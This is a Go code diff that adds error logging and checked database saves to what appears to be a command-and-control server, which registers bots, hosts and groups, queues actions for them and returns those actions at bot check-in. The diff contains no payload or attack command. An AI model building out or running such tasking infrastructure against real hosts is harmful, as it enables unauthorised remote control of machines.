@@ -35,6 +35,7 @@ func regBotUtil(prot *mcs.MCS) int32 {
 		Save(ctx)
 
 	if err != nil {
+		errLog.Printf("Error registering bot '%s': %s", uuid, err.Error())
 		return 500 // error registering bot
 	}
 
@@ -48,16 +49,17 @@ func regHostUtil(prot *mcs.MCS) int32 {
 	if hn == "" || ifc == "" {
 		return 400 // missing param
 	}
-	DBClient.Host. // Host Client.
-			Create().          // Host create builder.
-			SetHostname(hn).   // Set hostname value.
-			SetInterface(ifc). // set interface val
-			SetLastSeen(0).    // set last seen
-			SaveX(ctx)         // Create and return.
+	_, err := DBClient.Host. // Host Client.
+					Create().          // Host create builder.
+					SetHostname(hn).   // Set hostname value.
+					SetInterface(ifc). // set interface val
+					SetLastSeen(0).    // set last seen
+					Save(ctx)          // Create and return.
 
-	//if err != nil {
-	//	return 500 // error registering host
-	//}
+	if err != nil {
+		errLog.Printf("Error registering host '%s': %s", hn, err.Error())
+		return 500 // error registering host
+	}
 	return 200
 }
 
@@ -75,6 +77,7 @@ func regGroupUtil(prot *mcs.MCS) int32 {
 					Save(ctx)
 
 	if err != nil {
+		errLog.Printf("Error registering group '%s': %s", gn, err.Error())
 		return 500 // error registering group
 	}
 	return 200
@@ -100,6 +103,7 @@ func regHGUtil(prot *mcs.MCS) int32 {
 		AddMembers(hostObj).
 		Save(ctx)
 	if err != nil {
+		errLog.Printf("Error adding host '%s' to group '%s': %s", hn, gn, err.Error())
 		return 500 // error updating group
 	}
 	return 200
@@ -129,7 +133,8 @@ func addActSingleUtil(prot *mcs.MCS) int32 {
 		Save(ctx)
 
 	if err != nil {
-		return 500 // error registering bot
+		errLog.Printf("Error adding action '%s' with mode '%s', args '%s': %s", uuid, mode, args, err.Error())
+		return 500 // error adding action
 	}
 
 	return 200
@@ -150,6 +155,7 @@ func addActGroupUtil(prot *mcs.MCS) int32 {
 
 	hostList, err := grpObj.QueryMembers().All(ctx)
 	if err != nil {
+		errLog.Printf("Error querying host list: %s", err.Error())
 		return 500 // error querying host list
 	}
 
@@ -165,7 +171,8 @@ func addActGroupUtil(prot *mcs.MCS) int32 {
 			Save(ctx)
 
 		if err != nil {
-			return 500 // error registering bot
+			errLog.Printf("Error adding action '%s' with mode '%s', args '%s': %s", uuid, mode, args, err.Error())
+			return 500 // error adding action
 		}
 	}
 	return 200
@@ -187,7 +194,8 @@ func addResultUtil(prot *mcs.MCS) int32 {
 		SetResponded(true).
 		Save(ctx)
 	if err != nil {
-		return 500 // error updating group
+		errLog.Printf("Error adding result '%s': %s", uuid, err.Error())
+		return 500 // error adding result
 	}
 	return 200
 
@@ -209,6 +217,7 @@ func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
 	}
 	acts, err := hostObj.QueryActions().All(ctx)
 	if err != nil {
+		errLog.Printf("Error querying actions: '%s", err.Error())
 		return 500, actList // issue querying actions
 	}
 	if len(acts) == 0 {
